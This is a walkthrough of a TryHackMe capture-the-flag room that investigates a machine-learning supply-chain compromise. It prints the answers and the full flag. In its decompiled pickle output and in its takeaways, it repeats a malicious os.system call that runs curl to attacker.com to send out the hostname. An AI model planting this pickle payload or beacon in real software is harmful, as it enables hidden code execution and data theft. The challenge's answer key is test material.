# Payload

## Room Overview

Room Link: https://tryhackme.com/room/payload

The **Payload** room focuses on investigating a machine-learning supply-chain compromise.

The incident involves:

* A production model that was replaced without a scheduled deployment.
* A model obtained from an unfamiliar organisation.
* A malicious Python pickle payload.
* Outbound communication to an attacker-controlled server.
* A candidate H5 model containing a suspicious Lambda layer.
* A campaign ID split across two different artefacts.

The incident files are located at:

```bash
/opt/supply-chain/incident/
```

---

## 1. Inspect the Incident Files

Start by navigating to the incident directory:

```bash
cd /opt/supply-chain/incident
```

List the available files:

```bash
find . -maxdepth 3 -type f -printf '%p\n'
```

Expected structure:

```text
./models/baseline_model.h5
./models/original_model.safetensors
./models/production_model.pkl
./models/candidate_model.h5
./models/original_model.pkl
./checksums/expected_hashes.json
./project/requirements.txt
./logs/deployment.log
./logs/network.log
./logs/beacon_capture.log
```

The important artefacts are:

* `deployment.log` — deployment timeline.
* `network.log` — network connections.
* `beacon_capture.log` — captured attacker communication.
* `production_model.pkl` — currently deployed malicious model.
* `candidate_model.h5` — staged replacement model.
* `baseline_model.h5` — clean model for comparison.

---

# 2. Determine the Replacement Organisation

Read the deployment log:

```bash
cat logs/deployment.log
```

Look for the source of the replacement model.

The relevant entries are:

```text
[2024-01-26 14:32:12] INFO  Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: trustworthy-ai-lab
```

Therefore, the replacement model came from:

```text
trustworthy-ai-lab
```

### Answer

```text
trustworthy-ai-lab
```

---

# 3. Calculate the Time Between Deployment and the SOC Alert

The replacement model was deployed at:

```text
2024-01-26 14:32:16
```

The SOC alert occurred at:

```text
2024-02-16 03:14:00
```

The difference is:

```text
21 days
```

### Answer

```text
21
```

---

# 4. Decompile the Production Pickle

The production model is:

```text
models/production_model.pkl
```

Use Python's built-in `pickletools` module:

```bash
python3 -m pickletools models/production_model.pkl
```

The important section is:

```text
11: \x8c SHORT_BINUNICODE 'os'
16: \x8c SHORT_BINUNICODE 'system'
25: \x93 STACK_GLOBAL
27: \x8c SHORT_BINUNICODE 'curl "http://attacker.com/beacon" -d "host=$(hostname)"'
87: R REDUCE
```

This indicates that the pickle references:

```python
os.system
```

We can also use `fickling`:

```bash
fickling models/production_model.pkl
```

Output:

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

The payload executes an operating-system command during pickle loading.

### Answer

```text
os.system
```

---

# 5. Identify the Host Identity Command

The malicious command is:

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

The command used to obtain the host's identity is:

```bash
hostname
```

It is executed inside:

```bash
$(hostname)
```

### Answer

```text
hostname
```

---

# 6. Examine the Network Logs

Read the network log:

```bash
cat logs/network.log
```

The suspicious traffic is directed to:

```text
attacker.com
```

on port:

```text
443
```

The beacon capture contains the actual HTTP request.

Read it with:

```bash
cat logs/beacon_capture.log
```

Relevant entry:

```text
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
```

Therefore, the HTTP method is:

```text
POST
```

### Answer

```text
POST
```

---

# 7. Inspect the Candidate H5 Model

The inspection script is located at:

```text
/opt/supply-chain/tools/inspect_h5_model.py
```

Run it against the candidate model:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py models/candidate_model.h5
```

The output shows:

```text
=== Architecture Inspection: candidate_model.h5 ===

  Total layers: 5

  [OK]      InputLayer           input_layer_2
  [OK]      Flatten              flatten_2
  [OK]      Dense                dense_4
  [OK]      Dense                dense_5
  [WARNING] Lambda               manipulate_output (function: manipulate_output)
            exfil_suffix: pl41n_s1ght}

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

The suspicious layer is:

```text
manipulate_output
```

It is a `Lambda` layer, which is important because Lambda layers can contain arbitrary Python functionality that executes during model inference.

### Answer

```text
manipulate_output
```

---

# 8. Recover the Complete Campaign Flag

The room states that the campaign ID was split across two artefacts.

First, inspect:

```bash
cat logs/beacon_capture.log
```

The captured payload contains:

```text
PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
```

The first part is:

```text
THM{b4ckd00r_1n_
```

Next, inspect the candidate model:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py models/candidate_model.h5
```

The inspection output contains:

```text
exfil_suffix: pl41n_s1ght}
```

Combine the two fragments:

```text
THM{b4ckd00r_1n_
+
pl41n_s1ght}
```

The complete flag is:

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# Final Answers

| Question                              | Answer                         |
| ------------------------------------- | ------------------------------ |
| Replacement organisation              | `trustworthy-ai-lab`           |
| Days between deployment and SOC alert | `21`                           |
| Python function used by payload       | `os.system`                    |
| Host identity command                 | `hostname`                     |
| HTTP method                           | `POST`                         |
| Suspicious layer                      | `manipulate_output`            |
| Complete flag                         | `THM{b4ckd00r_1n_pl41n_s1ght}` |

---

# Key Takeaways

This investigation demonstrates several important ML supply-chain security issues:

### Malicious Pickle Deserialization

Python pickle files can execute arbitrary code when deserialized. The production model contained:

```python
os.system(...)
```

which caused a shell command to execute.

### Outbound Command-and-Control / Beaconing

The payload used:

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

to send the machine's hostname to an external server.

### Model Provenance

The replacement model originated from a previously unseen organisation:

```text
trustworthy-ai-lab
```

Model sources should therefore be verified before deployment.

### Suspicious H5 Lambda Layer

The candidate model contained:

```text
Lambda: manipulate_output
```

Lambda layers deserve additional scrutiny because they can contain executable Python logic.

### Defence-in-Depth

The incident demonstrates why ML deployments should include:

* Model provenance verification.
* Cryptographic hash verification.
* Safe model formats.
* Static model scanning.
* Network egress monitoring.
* Runtime sandboxing.
* Review of custom model layers.
* Detection of unexpected outbound connections.